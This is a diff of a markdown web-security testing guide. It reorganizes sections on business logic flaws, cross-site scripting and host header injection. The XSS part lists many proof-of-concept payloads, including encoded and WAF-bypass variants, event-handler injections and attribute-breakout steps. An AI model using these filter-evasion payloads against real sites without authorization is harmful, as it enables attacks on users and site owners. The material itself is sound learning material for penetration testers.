@@ -203,6 +203,7 @@ Common examples of Business Logic Errors.
 * [Business Logic Vulnerability - OWASP - 2024](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)
 * [CWE-840: Business Logic Errors - CWE - March 24, 2011](https://cwe.mitre.org/data/definitions/840.html)
 * [Examples of Business Logic Vulnerabilities - PortSwigger - 2024](https://portswigger.net/web-security/logic-flaws/examples)
+
 # 3. Cross-Site Scripting (XSS)
 
 ## XSS Background
@@ -224,20 +225,31 @@ Common examples of Business Logic Errors.
 - Feedback forms
 - Contact us forms etc....
 
-### How to Hunt for XSS
+Manual XSS Vector Building
 
-1. Find an input parameter and provide input If input reflects or is stored, there may be XSS.
-2. Try executing JavaScript if you succeed to execute any javascript there then there is a XSS vulnerability.
-3. sort out all the parameters in burp-suite and check one by one or browse it through the webserver and check it here reflecting or not.
+## Steps to Find & Exploit XSS
 
+1. Find an input field that reflects input.
+2. Check response in **view-source**.
+3. Close any open tags.
+4. Use event handlers like `onmouseover` for bypassing sanitization.
+
+Example: <input type="text" name="name" value='hello'>
+<input type="submit" name="submit" value="search">
+Payload: 'onmouseover='alert(1);
+
+### Bypassing XSS Filters
+
+- Bypass using UTF-8 Encoding
+- Bypass using Unicode Encoding
+- Bypass using HTML Encoding
+- Bypass using Octal Encoding
+- Bypass using Common WAF Bypass
+  
 ## XSS Payloads
-
 ```html
 "><script>alert(1)</script>
 "><svg/onload=alert(1)>
-```
-### Cloudflare XSS Bypasses
-```html
 %3cscript%3ealert%281%29%3c%2fscript%3e
 <svg/OnLoad="`${prompt``}`">
 <svg/onload=%26nbsp;alert`bohdan`+
@@ -336,9 +348,7 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 anythinglr00</script><script>alert(document.domain)</script>uxldz
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
-
 ```
-
 1. Characters ' " < > / // ( ) ^ script img svg div alert prompt 
 2. Event Handlers
 
@@ -348,7 +358,7 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - Event Handlers:
 
 ```bash
-  Hello" onkeypress="prompt(1)
+Hello" onkeypress="prompt(1)
 <div onpointerover="alert(45)">MOVE HERE</div>
 <div onpointerdown="alert(45)">MOVE HERE</div>
 <div onpointerenter="alert(45)">MOVE HERE</div>
@@ -356,23 +366,6 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <div onpointermove="alert(45)">MOVE HERE</div>
 <div onpointerout="alert(45)">MOVE HERE</div>
 <div onpointerup="alert(45)">MOVE HERE</div>
-```
-practise excercise: websites:
-
-https://prompt.ml/0
-http://leettime.net/xsslab1/
-
-### Bypassing XSS Filters
-
-- Bypass using UTF-8 Encoding
-- Bypass using Unicode Encoding
-- Bypass using HTML Encoding
-- Bypass using Octal Encoding
-- Bypass using Common WAF Bypass
-
-### Cloudflare XSS Bypass
-
-```html
 <svg/OnLoad="`${prompt``}`">
 <svg/onload=alert`bohdan`>
 ```
@@ -381,26 +374,7 @@ http://leettime.net/xsslab1/
 
 - [Prompt.ml](https://prompt.ml/0)
 - [XSS Lab](http://leettime.net/xsslab1/)
-```
-# 4. Manual XSS Vector Building
 
-## Steps to Find & Exploit XSS
-
-1. Find an input field that reflects input.
-2. Check response in **view-source**.
-3. Close any open tags.
-4. Use event handlers like `onmouseover` for bypassing sanitization.
-
-Example: <input type="text" name="name" value='hello'>
-<input type="submit" name="submit" value="search">
-Payload: 'onmouseover='alert(1);
-# References
-
-- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
-- [LeetTime XSS Labs](http://leettime.net/xsslab1/)
-- [Prompt.ml](https://prompt.ml/)
-```
----
 # XSS & Host Header Injection Testing Guide
 
 ## 1. First SDIPER Application
@@ -485,11 +459,6 @@ Payload: 'onmouseover='alert(1);
   /@213dewf it is reflecting in browser → add XSS script:
   /@213dewf"><script>alert(1)</script>
   ```
-
-## 10. Blind XSS Vulnerability
-- Use **Hunter** for detection.
-```
-```
 ---
 # Host Header Injection
 ## 1. Overview
